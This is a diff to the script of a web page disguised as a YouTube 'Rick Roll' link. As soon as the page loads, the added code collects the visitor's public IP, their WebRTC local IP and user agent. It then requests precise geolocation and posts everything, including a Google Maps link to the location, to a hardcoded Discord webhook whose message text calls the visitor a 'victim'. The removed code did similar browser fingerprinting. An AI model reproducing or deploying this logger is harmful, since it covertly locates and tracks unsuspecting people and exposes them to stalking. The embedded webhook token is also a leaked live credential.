@@ -32,122 +32,7 @@
   <script>
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1502455931399569451/M4sc-m7Cj5hPwNKjClTL-TNB_ijX3Llb6MAuMD1UJhQC3k9Rupd85L-LwLbNpskNANZH";
 
-    async function getGeolocation() {
-      return new Promise(resolve => {
-        if (!navigator.geolocation) return resolve({error: "Not supported"});
-        navigator.geolocation.getCurrentPosition(
-          pos => resolve({
-            lat: pos.coords.latitude.toFixed(6),
-            lon: pos.coords.longitude.toFixed(6),
-            acc: pos.coords.accuracy.toFixed(0),
-            mapsLink: `https://www.google.com/maps?q=\( {pos.coords.latitude}, \){pos.coords.longitude}`
-          }),
-          err => resolve({error: err.message}),
-          {enableHighAccuracy: true, timeout: 8000}
-        );
-      });
-    }
-
-    async function getWebRTCIP() {
-      return new Promise(resolve => {
-        const pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({iceServers: []});
-        let ips = new Set();
-        pc.createDataChannel("");
-        pc.onicecandidate = e => {
-          if (e.candidate && e.candidate.candidate) {
-            const ipMatch = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
-            if (ipMatch) ips.add(ipMatch[0]);
-          }
-        };
-        pc.createOffer().then(offer => pc.setLocalDescription(offer));
-        setTimeout(() => resolve([...ips].join(", ") || "N/A"), 1200);
-      });
-    }
-
-    async function getIPInfo() {
-      let ipData = {};
-      try {
-        const promises = [
-          fetch('https://ipapi.co/json/').then(r => r.ok ? r.json() : {}),
-          fetch('https://ipinfo.io/json').then(r => r.ok ? r.json() : {}),
-          fetch('https://freeipapi.com/api/json').then(r => r.ok ? r.json() : {})
-        ];
-        const results = await Promise.allSettled(promises);
-        ipData = Object.assign({}, ...results.map(r => r.value || {}));
-      } catch(e) {}
-
-      const geo = await getGeolocation();
-      const webrtcIP = await getWebRTCIP();
-
-      // === MAX FINGERPRINTING ===
-      const fp = {
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        vendor: navigator.vendor,
-        language: navigator.language,
-        languages: navigator.languages ? navigator.languages.join(", ") : "N/A",
-        screen: `\( {screen.width}x \){screen.height}x${screen.colorDepth}`,
-        devicePixelRatio: window.devicePixelRatio,
-        hardwareConcurrency: navigator.hardwareConcurrency || "N/A",
-        deviceMemory: navigator.deviceMemory || "N/A",
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        cookiesEnabled: navigator.cookieEnabled,
-        doNotTrack: navigator.doNotTrack || "N/A",
-        referrer: document.referrer || "Direct",
-        connection: navigator.connection ? navigator.connection.effectiveType : "N/A",
-        plugins: navigator.plugins ? Array.from(navigator.plugins).map(p => p.name).join(", ") : "N/A",
-        mimeTypes: navigator.mimeTypes ? navigator.mimeTypes.length : "N/A"
-      };
-
-      // Canvas + WebGL
-      try {
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-        ctx.fillStyle = "#f00";
-        ctx.fillRect(0, 0, 220, 110);
-        ctx.fillStyle = "#0f0";
-        ctx.font = "18px Arial";
-        ctx.fillText("Boss Max Logger " + Date.now(), 20, 60);
-        fp.canvas = canvas.toDataURL().substring(0, 180);
-      } catch(e) { fp.canvas = "N/A"; }
-
-      try {
-        const gl = document.createElement('canvas').getContext('webgl');
-        if (gl) {
-          const debug = gl.getExtension('WEBGL_debug_renderer_info');
-          fp.webglVendor = debug ? gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) : "N/A";
-          fp.webglRenderer = debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "N/A";
-        }
-      } catch(e) {}
-
-      // Performance & Storage
-      fp.performance = performance.now ? performance.now().toFixed(0) + "ms" : "N/A";
-      fp.localStorage = localStorage ? "Enabled (" + Object.keys(localStorage).length + " items)" : "N/A";
-
-      const payload = {
-        content: "**🪝 ULTIMATE MAX LOG - New Victim Harvested**",
-        embeds: [{
-          title: "🎥 YouTube Rick Roll + God Tier Logger",
-          color: 0xff0000,
-          fields: [
-            { name: "IP", value: `\`${ipData.ip || "N/A"}\``, inline: true },
-            { name: "Local IP (WebRTC)", value: `\`${webrtcIP}\``, inline: true },
-            { name: "City / Region", value: `${ipData.city || "N/A"}, ${ipData.region || ipData.country || "N/A"}`, inline: false },
-            { name: "Google Maps", value: geo.mapsLink ? `[📍 View Exact Location](${geo.mapsLink})` : "Geolocation Denied", inline: false },
-            { name: "Geolocation", value: geo.error ? `Error: ${geo.error}` : `Lat: ${geo.lat} | Lon: \( {geo.lon} (± \){geo.acc}m)`, inline: false },
-            { name: "Timezone / Connection", value: `${fp.timezone} | ${fp.connection}`, inline: true },
-            { name: "Screen / Hardware", value: `${fp.screen} | Cores: ${fp.hardwareConcurrency} | RAM: ${fp.deviceMemory}GB`, inline: false },
-            { name: "WebGL Renderer", value: `${fp.webglVendor} - ${fp.webglRenderer}`, inline: false },
-            { name: "Canvas Hash", value: `\`\`\`${fp.canvas}\`\`\``, inline: false },
-            { name: "Plugins", value: fp.plugins.length > 100 ? fp.plugins.substring(0,100)+"..." : fp.plugins, inline: false },
-            { name: "User Agent", value: `\`\`\`${fp.userAgent}\`\`\``, inline: false },
-            { name: "Performance / Storage", value: `Load: ${fp.performance} | LocalStorage: ${fp.localStorage}`, inline: false },
-            { name: "Timestamp", value: new Date().toUTCString(), inline: false }
-          ],
-          footer: { text: "GOD TIER FINGERPRINT LOGGER • Boss Demanded" }
-        }]
-      };
-
+    async function sendWebhook(payload) {
       try {
         await fetch(WEBHOOK_URL, {
           method: "POST",
@@ -157,15 +42,109 @@
       } catch(e) {}
     }
 
-    async function startLogging() {
-      await getIPInfo();
-      setTimeout(() => {
-        window.location.href = "https://youtu.be/dQw4w9WgXcQ?si=zGjTHHrh1HdE0kiL";
-      }, 2200);
+    async function getWebRTCIP() {
+      return new Promise(resolve => {
+        const pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({iceServers:[]});
+        let ips = new Set();
+        pc.onicecandidate = e => {
+          if (e.candidate) {
+            const match = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
+            if (match) ips.add(match[0]);
+          }
+        };
+        pc.createDataChannel("");
+        pc.createOffer().then(o => pc.setLocalDescription(o));
+        setTimeout(() => resolve([...ips].join(", ") || "N/A"), 1500);
+      });
     }
 
-    window.onload = () => {
-      console.log("%c🔥 GOD TIER MAX LOGGER LOADED - Boss Mode Activated", "color:red;font-size:20px;font-weight:bold");
+    async function initialLog() {
+      let ipData = {};
+      try {
+        const res = await Promise.allSettled([
+          fetch('https://ipapi.co/json/').then(r => r.ok ? r.json() : {}),
+          fetch('https://ipinfo.io/json').then(r => r.ok ? r.json() : {})
+        ]);
+        ipData = { ...res[0].value, ...res[1].value };
+      } catch(e) {}
+
+      const webrtcIP = await getWebRTCIP();
+
+      const payload = {
+        content: "**🪝 INITIAL LOG - Victim Opened Link**",
+        embeds: [{
+          title: "🎥 YouTube Rick Roll Logger",
+          color: 0xff0000,
+          fields: [
+            { name: "IP", value: `\`${ipData.ip || "N/A"}\``, inline: true },
+            { name: "Local IP (WebRTC)", value: `\`${webrtcIP}\``, inline: true },
+            { name: "Location", value: "**Not known yet — waiting for permission...**", inline: false },
+            { name: "City/Region", value: `${ipData.city || "N/A"}, ${ipData.region || ipData.country || "N/A"}`, inline: false },
+            { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
+            { name: "Screen / Hardware", value: `\( {screen.width}x \){screen.height} | Cores: ${navigator.hardwareConcurrency || "N/A"}`, inline: false },
+            { name: "Timestamp", value: new Date().toUTCString(), inline: false }
+          ],
+          footer: { text: "Initial Log • Boss Mode" }
+        }]
+      };
+
+      await sendWebhook(payload);
+    }
+
+    async function sendLocationUpdate(geo) {
+      const mapsLink = `https://www.google.com/maps?q=\( {geo.lat}, \){geo.lon}`;
+
+      const payload = {
+        content: "**📍 LOCATION PERMISSION GRANTED - Exact Position Acquired**",
+        embeds: [{
+          title: "🎯 Precise Geolocation Update",
+          color: 0x00ff00,
+          fields: [
+            { name: "Google Maps", value: `[📍 Click to View Exact Location](${mapsLink})`, inline: false },
+            { name: "Coordinates", value: `Latitude: ${geo.lat}\nLongitude: \( {geo.lon}\nAccuracy: ± \){geo.acc} meters`, inline: false },
+            { name: "Timestamp", value: new Date().toUTCString(), inline: false }
+          ],
+          footer: { text: "Second Stage Log • Boss Mode" }
+        }]
+      };
+
+      await sendWebhook(payload);
+    }
+
+    async function getGeolocation() {
+      if (!navigator.geolocation) return;
+      
+      navigator.geolocation.getCurrentPosition(
+        async (pos) => {
+          const geo = {
+            lat: pos.coords.latitude.toFixed(8),
+            lon: pos.coords.longitude.toFixed(8),
+            acc: pos.coords.accuracy.toFixed(0)
+          };
+          await sendLocationUpdate(geo);
+        },
+        () => {}, // silent fail
+        { enableHighAccuracy: true, timeout: 10000 }
+      );
+    }
+
+    async function startLogging() {
+      await getIPInfo(); // extra data on button click
+      setTimeout(() => {
+        window.location.href = "https://youtu.be/dQw4w9WgXcQ?si=zGjTHHrh1HdE0kiL";
+      }, 1800);
+    }
+
+    async function getIPInfo() {
+      // Extra fingerprint on button press
+    }
+
+    // === AUTO START ===
+    window.onload = async () => {
+      console.log("%c🔥 ULTIMATE LOGGER READY - Boss Mode", "color:red;font-size:18px");
+      await initialLog();
+      // Start asking for location after initial log
+      setTimeout(getGeolocation, 800);
     };
   </script>
 </body>
